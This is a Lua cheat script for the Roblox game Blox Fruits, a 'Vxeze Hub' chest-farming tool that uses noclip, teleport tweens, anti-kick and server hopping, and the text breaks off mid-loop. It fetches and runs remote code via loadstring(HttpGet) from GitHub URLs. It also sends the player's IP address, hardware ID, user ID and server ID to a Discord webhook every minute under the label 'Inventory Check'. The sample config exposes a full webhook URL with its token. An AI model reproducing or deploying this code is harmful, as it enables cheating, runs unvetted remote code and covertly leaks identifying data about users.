--[[
getgenv().config = {
    Setting = {
        ["Team"] = "Marines",         
        ["Disabled Notify"] = false,  
        ["Boots FPS"] = false,         
        ["White Screen"] = false,
        ["No Stuck Chair"] = true, 
        ["Auto Rejoin"] = true,
    },
    ChestFarm = {
        ["Start Farm Chest"] = true,   
        ["Stop When Have God's Chalice or Dark Key"] = true, 
    },
    Webhook = {
        ["Webhook Url"] = "https://discord.com/api/webhooks/1360798536937246840/HBIfH0Okazx7DxPPu8rNi_jYQSMWT4eis8HSx6UW83rLMgxQn6fgWShuqBbaiwxUEXmS",          
        ["Send Webhook"] = true,      
    },
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/Icarus-Ezz/phatyeuem/refs/heads/main/Chest.lua"))()
]]--

if getgenv().config.Setting["Team"] == "Marines" then
    if not game.Players.LocalPlayer.Team or game.Players.LocalPlayer.Team.Name ~= "Marines" then
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("SetTeam", "Marines")
    end
elseif getgenv().config.Setting["Team"] == "Pirates" then
    if not game.Players.LocalPlayer.Team or game.Players.LocalPlayer.Team.Name ~= "Pirates" then
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("SetTeam", "Pirates")
    end
end

wait(3)
------------------------------------------------------------------------------------
spawn(function()
    while wait() do
        if getgenv().config.Setting["Boots FPS"] then
            if game.Players.LocalPlayer.Character:FindFirstChild("Pants") then
                game.Players.LocalPlayer.Character.Pants:Destroy()
            end

            game.Players.LocalPlayer.Character.Animate.Disabled = true

            wait()

            loadstring(game:HttpGet("https://raw.githubusercontent.com/JewhisKids/NewFreeScript/main/Misc/SuperFpsBoost.lua"))()

            setfpscap(59)
        end
    end
end)

spawn(function()
    while wait() do
        if getgenv().config.Setting["White Screen"] then
            game:GetService("RunService"):Set3dRenderingEnabled(true)
        end
    end
end)

spawn(function()
    while wait() do
        if getgenv().config.Setting["Disabled Notify"] then
            local player = game:GetService("Players").LocalPlayer
            if player and player.PlayerGui then
                local notifications = player.PlayerGui:FindFirstChild("Notifications")
                if notifications then
                    notifications:Destroy()
                end
            end
        end
    end
end)


--//Code Ui
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local TWEEN_TIME = 0.6
local TWEEN_STYLE = Enum.EasingStyle.Quart
local TWEEN_DIRECTION = Enum.EasingDirection.Out
local SCREEN_WIDTH = workspace.CurrentCamera.ViewportSize.X
local SCREEN_HEIGHT = workspace.CurrentCamera.ViewportSize.Y
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
repeat wait() until Players.LocalPlayer
local LocalPlayer = Players.LocalPlayer
local oldBeli = 0
local earnedBeli = 0
local Converted = {}

local isMinimized = true
local isDragging = true

function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data = request({
        Url = Url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(message)
    })
    return data
end

function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
    local AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**📦 Inventory Check!**",
                ["description"] = "",
                ["color"] = tonumber(0xffffff),
                ["fields"] = {
                    {
                        ["name"] = "**👤 Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**🗿UserID**",
                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**🗿GameID**",
                        ["value"] = "```" .. game.PlaceId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🌇IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "💻 HWID",
                        ["value"] = "```" .. (gethwid and gethwid() or "Unknown") .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🧭 Job ID",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "📜Join Code",
                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "️🏆God's Chalice",
                        ["value"] = hasGodsChalice and "✅" or "❌",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🗝Fist of Darkness",
                        ["value"] = hasFistOfDarkness and "✅" or "❌",
                        ["inline"] = true
                    },
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

spawn(function()
    while true do
        local hasGodsChalice = false
        local hasFistOfDarkness = false

        -- Check Invntory
        for _, item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if item.Name == "God's Chalice" then
                hasGodsChalice = true
            elseif item.Name == "Fist of Darkness" then
                hasFistOfDarkness = true
            end
        end

        if getgenv().config.Webhook["Send Webhook"] then

            local message = AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
            PostWebhook(getgenv().config.Webhook["Webhook Url"], message)
        else
            print("Webhook not enabled.")
        end

        -- Check 60s/1
        task.wait(60)
    end
end)

spawn(function()
    local runService = game:GetService("RunService")
    local player = game.Players.LocalPlayer

    runService.Stepped:Connect(function()
        if getgenv().config.ChestFarm["Start Farm Chest"] then
            for _, part in pairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)
end)

local function FormatNumber(number)
    return tostring(number):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local function CreateSmoothCorner(instance, radius)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, radius or 8)
    corner.Parent = instance
    return corner
end

function SmartServerHop()
    if not _G.AutoHopEnabled then return end
    
    pcall(function()
        local servers = {}
        local req = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
        local data = game:GetService("HttpService"):JSONDecode(req)
        
        for i,v in pairs(data.data) do
            if v.playing < v.maxPlayers and v.id ~= game.JobId then
                table.insert(servers, v.id)
            end
        end
        
        if #servers > 0 then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)])
        else
            wait(30)
            SmartServerHop()
        end
    end)
end

if pcall(function() game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100") end) then
    HopServer = SmartServerHop
end

local function AntiKick()
    while true do
        wait(1)
        pcall(function()
            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local v1518 = Instance.new("BillboardGui", game.Players.LocalPlayer.Character.HumanoidRootPart);
                v1518.Name = "Esp";
                v1518.ExtentsOffset = Vector3.new(0, 1, 0);
                v1518.Size = UDim2.new(1, 300, 1, 50);
                v1518.Adornee = game.Players.LocalPlayer.Character.HumanoidRootPart;
                v1518.AlwaysOnTop = true;
                local v1524 = Instance.new("TextLabel", v1518);
                v1524.Font = "Code";
                v1524.FontSize = "Size14";
                v1524.TextWrapped = true;
                v1524.Size = UDim2.new(1, 0, 1, 0);
                v1524.TextYAlignment = "Top";
                v1524.BackgroundTransparency = 1;
                v1524.TextStrokeTransparency = 0.5;
                v1524.TextColor3 = Color3.fromRGB(255, 0, 0);  
                 v1524.Text = "gg.vxezehub";  
            end
            if game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Magnitude < 0.1 then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 0.01)
            end
        end)
    end
end

spawn(AntiKick)

--Rejoin
spawn(function()
    while wait() do
        if getgenv().config.Setting["Auto Rejoin"] then
            if not getgenv().rejoin then 
                getgenv().rejoin = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
                    if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
                        game:GetService("TeleportService"):Teleport(game.PlaceId)
                    end
                end)
            end
        end
    end
end)

local function Tween2(targetCFrame)
    pcall(function()
        local character = game.Players.LocalPlayer.Character
        if not character then return end

        local hrp = character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        local distance = (targetCFrame.Position - hrp.Position).Magnitude
        local speed = 350
        local travelTime = distance / speed

        local tweenInfo = TweenInfo.new(
            travelTime,
            Enum.EasingStyle.Linear,
            Enum.EasingDirection.InOut,
            0,
            false,
            0
        )

        local tween = game:GetService("TweenService"):Create(hrp, tweenInfo, {CFrame = targetCFrame})
        _G.CurrentTween = tween

        local connection
        connection = tween.Completed:Connect(function()
            EnableNoClipAndAntiGravity()
            if connection then connection:Disconnect() end
        end)

        tween:Play()

        -- Theo dõi thời gian để có thể dừng nếu điều kiện thay đổi
        local start = tick()
        while tick() - start < travelTime do
            if getgenv().StopTweenNow then
                tween:Cancel()
                _G.CurrentTween = nil
                return
            end
            task.wait(0.1)
        end

        _G.CurrentTween = nil
    end)
end

local function CreateStroke(parent, color, thickness)
    local stroke = Instance.new("UIStroke")
    stroke.Color = color or Color3.fromRGB(65, 65, 65)
    stroke.Thickness = thickness or 1.5
    stroke.Parent = parent
    return stroke
end

local function CreateDropShadow(parent)
    local shadow = Instance.new("ImageLabel")
    shadow.Name = "Shadow"
    shadow.AnchorPoint = Vector2.new(0.5, 0.5)
    shadow.BackgroundTransparency = 1
    shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
    shadow.Size = UDim2.new(1, 47, 1, 47)
    shadow.Image = "rbxassetid://6014261993"
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.ImageTransparency = 0.5
    shadow.Parent = parent
    return shadow
end

local function CreateMainGui()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "VxezeHubUI"
    ScreenGui.ResetOnSpawn = false

    -- Main
    Converted["_MainFrame"] = Instance.new("Frame")
    Converted["_MainFrame"].Name = "MainFrame"
    Converted["_MainFrame"].Size = UDim2.new(0, 350, 0, 300)
    Converted["_MainFrame"].Position = UDim2.new(0.5, -Converted["_MainFrame"].Size.X.Offset / 2, 0.5, -Converted["_MainFrame"].Size.Y.Offset / 2)  -- Căn giữa và dịch xuống một chút
    Converted["_MainFrame"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Converted["_MainFrame"].Parent = ScreenGui
    
    CreateDropShadow(Converted["_MainFrame"])
    CreateSmoothCorner(Converted["_MainFrame"], 12)

    -- Title Bar
    local TitleBar = Instance.new("Frame")
    TitleBar.Name = "TitleBar"
    TitleBar.Size = UDim2.new(1, 0, 0, 40)
    TitleBar.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
    TitleBar.Position = UDim2.new(0, 0, 0, 0)
    TitleBar.Parent = Converted["_MainFrame"]
    CreateSmoothCorner(TitleBar, 12)

    -- Title Logo
    local TitleLogo = Instance.new("ImageLabel")
    TitleLogo.Size = UDim2.new(0, 24, 0, 24)
    TitleLogo.Position = UDim2.new(0, 10, 0.5, -12)
    TitleLogo.BackgroundTransparency = 1
    TitleLogo.Image = "rbxassetid://91347148253026"
    TitleLogo.Parent = TitleBar

    -- Title Text
    local TitleText = Instance.new("TextLabel")
    TitleText.Size = UDim2.new(1, -100, 1, 0)
    TitleText.Position = UDim2.new(0, 40, 0, 0)
    TitleText.BackgroundTransparency = 1
    TitleText.Font = Enum.Font.GothamBold
    TitleText.Text = "Vxeze Hub Auto Chest"
    TitleText.TextColor3 = Color3.fromRGB(45, 45, 50)
    TitleText.TextSize = 16
    TitleText.TextXAlignment = Enum.TextXAlignment.Left
    TitleText.Parent = TitleBar

    -- Close Button
    local CloseButton = Instance.new("TextButton")
    CloseButton.Size = UDim2.new(0, 30, 0, 30)
    CloseButton.Position = UDim2.new(1, -40, 0, 5)
    CloseButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    CloseButton.Text = "X"
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.TextSize = 16
    CloseButton.Parent = TitleBar
    CreateSmoothCorner(CloseButton)

    -- Minimize Button
    local MinimizeButton = Instance.new("TextButton")
    MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
    MinimizeButton.Position = UDim2.new(1, -80, 0, 5)
    MinimizeButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    MinimizeButton.Text = "-"
    MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    MinimizeButton.TextSize = 16
    MinimizeButton.Parent = TitleBar
    CreateSmoothCorner(MinimizeButton)

    -- Stats Section
    Converted["_Stats"] = Instance.new("Frame")
    Converted["_Stats"].Name = "Stats"
    Converted["_Stats"].Size = UDim2.new(1, -20, 0, 180)
    Converted["_Stats"].Position = UDim2.new(0, 10, 0, 50)
    Converted["_Stats"].BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Converted["_Stats"].Parent = Converted["_MainFrame"]
    
    local function CreateStatLabel(yPos)
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -20, 0, 30)
        label.Position = UDim2.new(0, 10, 0, yPos)
        label.Font = Enum.Font.GothamSemibold
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.TextSize = 14
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.BackgroundTransparency = 1
        label.Parent = Converted["_Stats"]
        return label
    end
    
    Converted["_TimeLabel"] = CreateStatLabel(10)
    Converted["_BeliLabel"] = CreateStatLabel(50)
    Converted["_EarnedBeliLabel"] = CreateStatLabel(90)
    Converted["_ChestLabel"] = CreateStatLabel(130)
    
    Converted["_Controls"] = Instance.new("Frame")
    Converted["_Controls"].Name = "Controls"
    Converted["_Controls"].Size = UDim2.new(1, -20, 0, 40)
    Converted["_Controls"].Position = UDim2.new(0, 10, 0, 230)
    Converted["_Controls"].BackgroundTransparency = 1
    Converted["_Controls"].Parent = Converted["_MainFrame"]
    
    local function CreateButton(text, color, position)
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(0.48, 0, 1, 0)
        button.Position = position
        button.BackgroundColor3 = color
        button.Font = Enum.Font.GothamBold
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.TextSize = 14
        button.Text = text
        button.Parent = Converted["_Controls"]
        
        CreateSmoothCorner(button)
        CreateStroke(button, color:Lerp(Color3.new(0, 0, 0), 0.2))
        
        local originalColor = color
        button.MouseEnter:Connect(function()
            TweenService:Create(button, TweenInfo.new(0.3), {
                BackgroundColor3 = color:Lerp(Color3.new(1, 1, 1), 0.1)
            }):Play()
        end)
        
        button.MouseLeave:Connect(function()
            TweenService:Create(button, TweenInfo.new(0.3), {
                BackgroundColor3 = originalColor
            }):Play()
        end)
        
        return button
    end
    
    Converted["_StartButton"] = CreateButton("Start", Color3.fromRGB(46, 204, 113), UDim2.new(0, 0, 0, 0))
    Converted["_StopButton"] = CreateButton("Stop", Color3.fromRGB(231, 76, 60), UDim2.new(0.52, 0, 0, 0))
    
    local MiniUI = Instance.new("Frame")
    MiniUI.Name = "MiniUI"
    MiniUI.Size = UDim2.new(0, 50, 0, 50)
    MiniUI.Position = UDim2.new(0.5, -MiniUI.Size.X.Offset / 2, 0, 10)
    MiniUI.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
    MiniUI.Visible = true
    MiniUI.Parent = ScreenGui
    CreateSmoothCorner(MiniUI, 8)
    
    local RestoreButton = Instance.new("ImageButton")
    RestoreButton.Size = UDim2.new(0, 50, 0, 50) 
    RestoreButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    RestoreButton.Image = "rbxassetid://91347148253026" 
    RestoreButton.Position = UDim2.new(0.5, -RestoreButton.Size.X.Offset / 2, 0.5, -RestoreButton.Size.Y.Offset / 2)
    RestoreButton.Parent = MiniUI
    CreateSmoothCorner(RestoreButton)
    
    local dragging, dragStart, startPos
    TitleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = Converted["_MainFrame"].Position
            
            local connection
            connection = input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    connection:Disconnect()
                end
            end)
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Converted["_MainFrame"].Position = UDim2.new(
                startPos.X.Scale, 
                startPos.X.Offset + delta.X, 
                startPos.Y.Scale, 
                startPos.Y.Offset + delta.Y
            )
        end
    end)
    
    CloseButton.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)
    
    MinimizeButton.MouseButton1Click:Connect(function()
        isMinimized = not isMinimized
        Converted["_MainFrame"].Visible = not isMinimized
        MiniUI.Visible = isMinimized
    end)
    
    RestoreButton.MouseButton1Click:Connect(function()
        isMinimized = false
        Converted["_MainFrame"].Visible = true
        MiniUI.Visible = false
    end)
    
    return ScreenGui
end

local function UpdateTime()
    local GameTime = math.floor(workspace.DistributedGameTime + 0.5)
    local Hour = math.floor(GameTime/(60^2))%24
    local Minute = math.floor(GameTime/(60^1))%60
    local Second = math.floor(GameTime/(60^0))%60
    Converted["_TimeLabel"].Text = string.format("⏰ Time: %02d:%02d:%02d", Hour, Minute, Second)
end

local function UpdateStats()
    local player = game:GetService("Players").LocalPlayer
    local beli = player.Data.Beli.Value

    if oldBeli == 0 then
        oldBeli = beli
    else
        earnedBeli = beli - oldBeli
    end

    local chestCount = 0
    for _, v in pairs(workspace:GetDescendants()) do
        -- Kiểm tra đối tượng có tên chứa từ "chest" và là BasePart hoặc có "TouchInterest"
        if string.find(v.Name:lower(), "chest") and v:IsA("BasePart") and v:FindFirstChild("TouchInterest") then
            chestCount = chestCount + 1
        end
    end

    Converted["_BeliLabel"].Text = string.format("💰 Beli: %s", FormatNumber(beli))
    Converted["_EarnedBeliLabel"].Text = string.format("📈 Earned: %s", FormatNumber(earnedBeli))
    Converted["_ChestLabel"].Text = string.format("🎁 Chests: %d", chestCount)
end

spawn(function()
    while true do
        UpdateStats()
        wait(1)
    end
end)

local function InitializeScript()
    local gui = CreateMainGui()
    gui.Parent = game:GetService("CoreGui")
    
Converted["_StartButton"].MouseButton1Click:Connect(function()
        getgenv().config.ChestFarm["Start Farm Chest"] = true
        getgenv().config.Setting["No Stuck Chair"] = true  
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Vxeze Hub Auto Chest",
            Text = "Auto Chest Started!",
            Duration = 2
        })
    end)
    
    Converted["_StopButton"].MouseButton1Click:Connect(function()
        getgenv().config.ChestFarm["Start Farm Chest"] = false
        getgenv().config.Setting["No Stuck Chair"] = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Vxeze Hub Auto Chest",
            Text = "Auto Chest Stopped!",
            Duration = 2
        })
    end)
   
    task.spawn(function()
        while true do
            UpdateTime()
            UpdateStats()
            task.wait(1)
        end
    end)
end

InitializeScript()

function StopTween()
    -- Kiểm tra nếu không có tween
    if not getgenv().StopTween then
        getgenv().StopTween = true            
        -- Dừng tween nếu đang có tween
        if tween then
            tween:Cancel()  -- Hủy tween hiện tại
            tween = nil
        end            

        -- Lấy HumanoidRootPart của nhân vật
        local player = game:GetService("Players").LocalPlayer
        local character = player and player.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        
        if humanoidRootPart then
            humanoidRootPart.Anchored = true  -- Đảm bảo không bị di chuyển
            task.wait(0.1)  -- Chờ một chút để đảm bảo dừng lại hoàn toàn
            humanoidRootPart.CFrame = humanoidRootPart.CFrame  -- Đảm bảo không di chuyển
            humanoidRootPart.Anchored = false
        end

        -- Xóa BodyClip nếu có
        local bodyClip = humanoidRootPart and humanoidRootPart:FindFirstChild("BodyClip")
        if bodyClip then
            bodyClip:Destroy()  -- Xóa BodyClip để ngừng no-clip
        end

        -- Reset trạng thái StopTween và Clip
        getgenv().StopTween = false
        getgenv().Clip = false
    end
end

spawn(function()
    while task.wait() do
        pcall(function()
            if getgenv().config.ChestFarm["Start Farm Chest"] then
                local player = game:GetService("Players").LocalPlayer
                local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                
                -- Kiểm tra xem BodyClip đã tồn tại chưa, nếu chưa thì tạo mới
                if humanoidRootPart and not humanoidRootPart:FindFirstChild("BodyClip") then
                    local Noclip = Instance.new("BodyVelocity")
                    Noclip.Name = "BodyClip"
                    Noclip.Parent = humanoidRootPart
                    Noclip.MaxForce = Vector3.new(100000, 100000, 100000)  -- Force cao để không bị va chạm
                    Noclip.Velocity = Vector3.new(0, 0, 0)  -- Không chuyển động
                end
            else
                -- Nếu không phải "Start Farm Chest", xóa BodyClip nếu tồn tại
                local bodyClip = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip")
                if bodyClip then
                    bodyClip:Destroy()
                end
            end
        end)
    end
end)

local seaThirdSea = CFrame.new(-5056.14794921875, 314.68048095703125, -2985.12255859375)  -- Third Sea (Castle)
local seaSecondSea = CFrame.new(-411.2250061035156, 73.31524658203125, 371.2820129394531)     -- Second Sea (Cafe)

-- ========== Tự phát hiện vùng ==========
local function GetSeaCoordinates()
    if game.PlaceId == 4442272183 then  
        return seaSecondSea
    elseif game.PlaceId == 7449423635 then  
        return seaThirdSea
    else
        return nil
    end
end
--Check Backpack
spawn(function()
    while wait() do
        if getgenv().config.ChestFarm["Stop When Have God's Chalice or Dark Key"] then
            local hasGodsChalice = game.Players.LocalPlayer.Backpack:FindFirstChild("God's Chalice") or game.Players.LocalPlayer.Character:FindFirstChild("God's Chalice")
            local hasFistOfDarkness = game.Players.LocalPlayer.Backpack:FindFirstChild("Fist of Darkness") or game.Players.LocalPlayer.Character:FindFirstChild("Fist of Darkness")

            if hasGodsChalice or hasFistOfDarkness then
                    
                getgenv().config.ChestFarm["Start Farm Chest"] = false
                getgenv().config.Setting["No Stuck Chair"] = false
                    
                local seaCoordinates = GetSeaCoordinates()
                if seaCoordinates then
                    Tween2(seaCoordinates)
                    wait(1.5)
                end
                    
                break
            end
        end
    end
end)


-- ========== Auto Jump nếu kẹt ghế ==========
function AutoJump()
    while getgenv().config.Setting["No Stuck Chair"] do
        pcall(function()
            local char = game.Players.LocalPlayer.Character
            local humanoid = char and char:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Jump = true
            end
        end)
        wait(2)
    end
end

spawn(AutoJump)
--------------------------Ui
function StartCountdownAndHop(countdownTime)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    screenGui.ResetOnSpawn = false

    -- Background phủ toàn màn hình
    local background = Instance.new("ImageLabel")
    background.Parent = screenGui
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.Image = "rbxassetid://91347148253026"
    background.ImageTransparency = 0.35
    background.BackgroundTransparency = 1
    background.ZIndex = 0

    local logo = Instance.new("ImageLabel")
    logo.Parent = screenGui
    logo.Size = UDim2.new(0, 100, 0, 100)
    logo.Position = UDim2.new(0.5, -50, 0.3, -50)
    logo.Image = "rbxassetid://91347148253026"
    logo.BackgroundTransparency = 1
    logo.ZIndex = 2

    local progressBarBackground = Instance.new("Frame")
    progressBarBackground.Parent = screenGui
    progressBarBackground.Size = UDim2.new(0, 300, 0, 12)
    progressBarBackground.Position = UDim2.new(0.5, -150, 0.5, 30)
    progressBarBackground.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    progressBarBackground.BorderSizePixel = 0
    progressBarBackground.ZIndex = 1

    local bgCorner = Instance.new("UICorner", progressBarBackground)
    bgCorner.CornerRadius = UDim.new(0, 10)

    local progressBar = Instance.new("Frame")
    progressBar.Parent = progressBarBackground
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    progressBar.ZIndex = 2

    local barCorner = Instance.new("UICorner", progressBar)
    barCorner.CornerRadius = UDim.new(0, 10)

    local countdownLabel = Instance.new("TextLabel")
    countdownLabel.Parent = screenGui
    countdownLabel.Size = UDim2.new(0, 300, 0, 50)
    countdownLabel.Position = UDim2.new(0.5, -150, 0.5, -20)
    countdownLabel.BackgroundTransparency = 1
    countdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    countdownLabel.TextSize = 30
    countdownLabel.Font = Enum.Font.GothamBold
    countdownLabel.TextStrokeTransparency = 0.6
    countdownLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
    countdownLabel.ZIndex = 3

    -- Mượt từng frame
    local startTime = tick()
    local endTime = startTime + countdownTime

    while tick() < endTime do
        local remaining = math.ceil(endTime - tick())
        local percent = 1 - ((endTime - tick()) / countdownTime)
        countdownLabel.Text = remaining .. "s"
        progressBar.Size = UDim2.new(percent, 0, 1, 0)
        task.wait()
    end

    countdownLabel.Text = "Vxeze Hopping"
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Vxeze Hub",
        Text = "Vxeze Hopping",
        Duration = 4
    })

    wait(1.5)
    Hop()
end

----------------------------------------------------------------------------------------------------
local lastPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
local idleTime = 0 -- thời gian đứng im

local function CheckIdleTime()
    local currentPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
    if currentPosition == lastPosition then
        idleTime = idleTime + 1
    else
        idleTime = 0 -- reset nếu di chuyển
    end
    lastPosition = currentPosition
end

spawn(function()
    while true do
        CheckIdleTime()

        if idleTime >= 600 then  
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Idle Timeout",
                Text = "Đã đứng im quá 10 phút, chuyển server...",
                Duration = 4
            })
            
            Hop()  
            idleTime = 0 
            break
        end
        
        wait(1) 
    end
end)

local function GetChest()
    local distance = math.huge
    local closestChest = nil
    for _, v in pairs(workspace.Map:GetDescendants()) do
        if string.find(v.Name:lower(), "chest") and v:FindFirstChild("TouchInterest") and v:IsA("BasePart") then
            if v.Position.Y < -10 then continue end -- Bỏ qua rương dưới map
            local d = (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
            if d < distance then
                distance = d
                closestChest = v
            end
        end
    end
    return closestChest
end

-- Quá trình nhặt rương tự động
spawn(function()
    local startTime = tick() -- Lưu thời gian bắt đầu server

    while true do
        if getgenv().config.ChestFarm["Start Farm Chest"] then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Auto Chest",
                Text = "Đang tìm rương...",
                Duration = 3
            })

            _G.AutoCollectChest = true
            _G.IsChestFarming = true

            local function AutoChestCollect()
                local timeout = 0
                while getgenv().config.ChestFarm["Start Farm Chest"] do
                    local chest = GetChest()
                    if chest and chest:IsDescendantOf(workspace) then
                        -- Di chuyển đến rương
                        Tween2(chest.CFrame)

                        -- Chạm rương để nhặt
                        pcall(function()
                            firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, chest, 0)
                            firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, chest, 1)
                        end)

                        local start = tick()
                        repeat task.wait(0.1) until not chest:IsDescendantOf(workspace) or tick() - start > 1

                        if not chest:IsDescendantOf(workspace) then
                            _G.LastChestCollectedTime = tick()
                            _G.CollectedChests = (_G.CollectedChests or 0) + 1
                            timeout = 0
                        end
                    else
                        timeout = timeout + 1
                        if timeout >= 2 then
                            StartCountdownAndHop(10) 
                            break
                        end
                        wait(1)
                    end

                    if tick() - startTime >= 300 then
                        if _G.CurrentTween then
                            _G.CurrentTween:Cancel()
                            _G.CurrentTween = nil
                        end    
                            
                        game:GetService("StarterGui"):SetCore("SendNotification", {
                            Title = "Vxeze Hub Auto Chest",
                            Text = "Đã ở trong server 5 phút, chuyển server...",
                            Duration = 4
                        })
                        StartCountdownAndHop(10)
                        startTime = tick()    
                        break
                    end
                end
            end

            AutoChestCollect()
        end
        wait(1)
    end
end)

--HOP Server
function Hop()
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour

    function TPReturner()
        local Site
        if foundAnything == "" then
            Site = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100"))
        else
            Site = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. foundAnything))
        end

        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
            foundAnything = Site.nextPageCursor
        end

        for _, v in pairs(Site.data) do
            local ID = tostring(v.id)
            local Possible = true

            if tonumber(v.maxPlayers) > tonumber(v.playing) then
                for _, Existing in pairs(AllIDs) do
                    if ID == tostring(Existing) then
                        Possible = false
                        break
                    end
                end

                if Possible then
                    table.insert(AllIDs, ID)
                    wait(1)
                    pcall(function()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                    end)
                    wait(4)
                    return
                end
            end
        end
    end

    function Teleport()
        while true do
            pcall(function()
                TPReturner()
                if foundAnything ~= "" then
                    TPReturner()
                end
            end)
            wait(5)
        end
    end

    Teleport()
end

--Post Webhook
spawn(function()
    while true do
        local hasGodsChalice = false
        local hasFistOfDarkness = false

        for _, item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if item.Name == "God's Chalice" then
                hasGodsChalice = true
            elseif item.Name == "Fist of Darkness" then
